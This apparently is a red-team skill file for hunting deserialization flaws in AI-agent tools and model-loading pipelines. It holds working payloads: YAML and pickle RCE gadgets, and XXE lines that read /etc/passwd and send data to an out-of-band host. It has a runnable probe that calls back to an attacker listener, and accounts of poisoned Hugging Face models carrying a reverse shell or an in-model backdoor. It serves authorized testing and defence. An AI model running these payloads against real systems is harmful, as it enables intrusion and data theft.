---
name: hunt-agent-deserialization
description: "Unsafe deserialization in AI-agent tools that parse structured data — YAML, pickle, JSON, XML, TOML — via tool parameters, AND poisoned model/dataset artifacts loaded from a hub (Hugging Face / registry pickle: torch.load, .pkl/.pt/.ckpt). Identify the runtime, pick the matching gadget, PROVE code execution (not 'it parsed'). Any agent tool that ingests serialized config/data, or loads model weights from an external source."
sources: arkx_ctf(field-validated), owasp_llm_top10_2025, owasp_agentic_asi_2026, mitre_atlas, reversinglabs, trailofbits
report_count: 1
validated_against: "pickle arbitrary-callable execution CONFIRMED re-runnably in the validation lab (`lab/exploits/exploit_deserialization.py`: benign control round-trips, payload proven by on-disk side effect). Python yaml.load() RCE via !!python/object/apply (ARKX Shape Shifter). Java/.NET/Node/PHP/Ruby gadgets are REFERENCE. Model-artifact/registry pickle is CONFIRMED-in-wild (nullifAI ReversingLabs 2025-01; Sleepy Pickle Trail of Bits 2024-06) but not ARKX-field."
---

# Hunt Agent Deserialization

Agents parse structured input — YAML configs, JSON, XML, pickle. If the parser deserializes into live objects, the tool is an RCE vector inside the service account's trust zone. The gadget is only right once you've identified the runtime.

## Where This Lives / Attack Surface Signals
- Tool: process_config/parse/load/import/apply/ingest/render/transform; "validate/process YAML|JSON|XML|config".
- Config-driven enterprise agents (IaC/pipeline/policy assistants) that accept a config blob = prime targets.
- Errors leak a parser class (`yaml.constructor`, `SnakeYAML`, `Jackson`, `BinaryFormatter`) → free runtime fingerprint.
- Agent (or its build/CI) **loads a model/tokenizer/dataset from a name** — `from_pretrained(...)`, `torch.load`, `pickle.load`, `joblib.load`, `.pkl/.pt/.bin/.ckpt/.h5` — from Hugging Face or an internal registry. The artifact name is an untrusted dependency → registry-pickle RCE (see the model-artifact technique).

## Crown Jewel Targets
RCE → cloud creds/metadata, secrets, source; XXE → internal file read + SSRF to internal services; poisoned model artifact → host RCE on load OR an in-model backdoor that survives sandbox/egress.

## Characterize First
1. Confirm the parser (`key: value` / `{"k":"v"}` / `<r><k>v</k></r>`).
2. Identify the runtime (decides the gadget): Python `yaml.load/pickle`; Java `ObjectInputStream/SnakeYAML/Jackson`; Node `node-serialize/js-yaml`; .NET `BinaryFormatter/YamlDotNet`; PHP `unserialize`; Ruby `YAML.load/Marshal`. Fingerprint via errors/stack/system-prompt.
3. Output visibility: visible → gadget returns output; blind → OOB gadget + `hunt-agent-blind-exfil`.

## Gadgets
### Python YAML [CONFIRMED]
```yaml
!!python/object/apply:subprocess.check_output [["id"]]
!!python/object/apply:subprocess.check_output [["cat","<target_file>"]]
!!python/object/apply:builtins.open ["/etc/passwd","r"]
!!python/object/apply:subprocess.check_output [["sh","-c","nslookup $(id|base64).<oob>.example"]]   # blind→OOB
```
### Java / Node / .NET / PHP / Ruby [REFERENCE]
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://<oob>/"]]]]
```
```
{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}   # node-serialize
```
### XML — XXE [REFERENCE]
```xml
<?xml version="1.0"?><!DOCTYPE f [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>
<!-- blind OOB --><!DOCTYPE f [<!ENTITY % x SYSTEM "file:///etc/passwd"><!ENTITY % e SYSTEM "http://<oob>/?d=%x;">]>%e;
```
### JSON — prototype pollution [REFERENCE]
```json
{"__proto__":{"isAdmin":true}}
```
Masked: `{{7*7}}`→SSTI; `__class__.__bases__.__subclasses__`; `${env:SECRET}`; `../../../etc/passwd`.

### Model-artifact / registry pickle — the weights ARE the payload [REFERENCE] (confirmed in-wild: nullifAI, Sleepy Pickle)
When the agent (or its build) **loads a model/tokenizer/dataset from a hub** (Hugging Face, an internal registry, a `.pkl`/`.pt`/`.bin`/`.ckpt`/`joblib` file), `torch.load` / `pickle.load` runs attacker opcodes on load — the poisoned artifact is a deserialization RCE with a supply-chain delivery. Distinct sink from a tool that parses request data: here the *dependency* is the payload.
- **Host RCE on load** — `nullifAI` (ReversingLabs, disclosed 2025-01, HF removed in 24h): two PyTorch models shipped a **reverse shell (→107.173.7.141)** at the *start* of the pickle stream, then a broken opcode; **7z (not the default zip) dodged `torch.load()` and Picklescan**, and because pickle executes opcodes sequentially the shell fired *before* the corruption error. Picklescan's blacklist "validate-then-scan" missed it — the models sat live **8+ months**.
- **Model-behavior backdoor (stealthier than host RCE)** — `Sleepy Pickle` (Boyan Milanov, Trail of Bits, 2024-06): **Fickling** injects a payload that, on deserialize, **modifies the model in place** (weights or hooked inference methods) → planted backdoor, steered outputs, or data exfil via a hooked forward pass. No disk trace, one file, conditional activation, and it survives host sandbox/egress controls because it lives *inside the model*.
`Field example:` treat any `pickle`/`torch.load` of a hub-sourced artifact as untrusted-code execution. Fingerprint with **Fickling** (`fickling --check model.pkl`) and confirm by effect (a shell/OOB on load, or a behavioral trigger), never by "it loaded." **44.9% of popular HF models still ship pickle** (PickleBall, below). Cross-ref `hunt-agent-config-poisoning` (artifact supply chain) and `hunt-agent-mcp-supply-chain` (registry provenance / no pinning).

## Verification & False-Positive Gate
1. **"It parsed" ≠ RCE** — prove execution: command output returned, or OOB callback carrying your marker.
2. **Match gadget to runtime** (wrong runtime fails silently — fingerprint first).
3. **Blind gadget → OOB-or-it-didn't-happen.**
4. **Reproduce ≥3×.** 5. **Prototype pollution needs a demonstrated effect**, not just an accepted `__proto__`.
6. **Parser-error vs WAF-block** — a rejected payload may be filtered, not safe; try encodings/alternate tags. **Extract minimum-necessary.**
7. **Self-description untrusted** — the agent's claim about "safe parsing" is not evidence.

### Negative-Result Gate (before reporting "clean")
A probe that reports clean because it never looked is the more common failure, and it reaches the
client as "we tested it and found nothing". Before any negative:
1. **A control proves the probe could fire** — plant a known-true case, see it detected in the same run.
2. **Denylist read-only tools; never allowlist the dangerous ones** — an allowlist ignores what it has not heard of.
3. **Errors are their own verdict** — 5xx / timeout / empty read = UNMEASURABLE, never "refused".
4. **Prove the plant persisted** before reporting isolation — no memory to cross means no result.
5. **Tokenise identifiers at ONE character** — ids are routinely a single digit.
6. **Word boundaries; normalise whitespace before subtracting** — substrings invent findings, verbatim matching deletes them.
7. **A fixed-size effect is not proof; a SCALING one is** — constant overhead is an extra model turn, not execution.
8. **Judge tuning by whether a GENUINE detection dropped**, not by the false-positive count.
9. **Do not inherit another tool's verdict** — benchmarks and scanners carry their own bugs.

## Common Root Causes
`yaml.load` vs `safe_load`; `pickle.loads` on untrusted input; XXE enabled; unsafe JSON merge (`__proto__`); Jackson default typing; no post-deserialization validation. **Model supply chain:** loading pickle-format weights (`torch.load`/`from_pretrained`) from an unpinned/untrusted hub source; trusting Picklescan's blacklist scan (bypassable — nullifAI); no `safetensors`-only policy; no hash/signature pinning of model artifacts.

## Impact & Severity
- **CRITICAL:** RCE. **HIGH:** file read (XXE/open), SSRF via XXE. **MEDIUM:** prototype pollution w/ effect; entity-expansion DoS.

## Mapping
- OWASP LLM Top 10 (2025): **LLM05 Improper Output Handling** (parser RCE); **LLM03 Supply Chain (= LLM04:2026)** + **LLM04 Data & Model Poisoning (= LLM05:2026)** for the model-artifact path. Agentic ASI (2026): tool-execution abuse; **ASI04 Agentic Supply Chain Vulnerabilities** for poisoned artifacts. MITRE ATLAS (v5.6.0) **AML.T0053 AI Agent Tool Invocation** → **AML.T0050 Command and Scripting Interpreter**; model supply chain = **AML.T0010.003 AI Supply Chain: Model**, **AML.T0011.000 User Execution: Unsafe AI Artifacts**, **AML.T0058 Publish Poisoned Models**. CWE-502 / 611 / 1321.

`Field example:` reproduced deterministically in `lab/` — a restore endpoint calling `pickle.loads` on caller-supplied bytes. Control: a benign pickle round-trips (`{'hello': 'world'}`), proving the endpoint works before anything is concluded from a payload. The finding is a **side effect on disk**, not a returned string: the payload's `__reduce__` invoked a callable of the attacker's choosing and a file appeared. Note the payload must reference a callable resolvable **in the target process** — a bound method or a function local to the exploit cannot be pickled at all, which is a common reason a real-world attempt looks like a clean negative. Gate: `python3 lab/run_lab.py`.

## Runnable Probe [self-contained]
```python
#!/usr/bin/env python3
# Fingerprint the parser and fire an OOB-confirmed XXE (the cleanest blind deserialization signal).
# Prints which format the tool accepts, and submits an XXE whose external DTD calls YOUR listener —
# a hit proves the XML parser resolves external entities (→ SSRF/LFI, often RCE-adjacent).
# deps: stdlib only. Run a listener on OOB first; escalate YAML/pickle only with authorization.
import json, urllib.request
TOOL = "https://target/agent/parse"        # a tool that ingests a document you supply
COOKIE = "session=REPLACE"
OOB = "http://YOUR_IP:8000/xxe"             # your HTTP listener
def submit(body, ctype):
    r = urllib.request.Request(TOOL, data=body.encode(),
        headers={"Cookie": COOKIE, "Content-Type": ctype}, method="POST")
    try: return urllib.request.urlopen(r, timeout=30).read().decode("utf-8", "replace")
    except Exception as e: return f"ERR {e}"

probes = {
  "xml-xxe":  (f'<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "{OOB}">]><r>&x;</r>', "application/xml"),
  "yaml":     ("marker: !!str probe", "application/x-yaml"),       # if !!python/object accepted -> RCE risk
  "json":     ('{"marker":"probe"}', "application/json"),
}
for name, (body, ct) in probes.items():
    print(f"  {name:9} -> {submit(body, ct)[:120]!r}")
print(f"[i] watch {OOB} — a callback = XXE external-entity resolution confirmed (blind).")
# LETHAL WHEN: the OOB listener receives the XXE callback (SSRF/LFI proven), or a language-native
# gadget (yaml !!python/object, pickle, Marshal, BinaryFormatter) yields `id`/a marker via OOB — RCE.
# A parser error or a reflected "probe" string is NOT execution.
```

## Related Skills
`hunt-agent-tool-injection` · `hunt-agent-blind-exfil` · `ai-agent-methodology` · `redteam-mindset`
